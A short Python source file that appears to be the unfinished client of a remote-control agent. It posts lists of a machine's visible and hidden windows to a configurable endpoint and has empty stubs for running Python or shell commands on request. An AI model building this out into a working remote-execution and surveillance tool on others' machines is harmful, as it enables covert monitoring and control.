from helpers.open_windows import WindowCatcher
from helpers import secure_requests


class Executor:

    def __init__(self, endpoint):
        self.endpoint = endpoint

    def handle(self, data):
        # iets met self.python of self.cmd oid.
        pass

    def python(self):
        pass

    def cmd(self):
        pass

    def send_open_windows(self):
        visible, hidden = WindowCatcher().collect()
        secure_requests.post(self.endpoint, data={
            'action': 'send_open_windows',
            'data': {
                'visible': visible,
                'hidden': hidden
            }
        })

    public_functions = {
        'python': python,
        'cmd': cmd,
    }
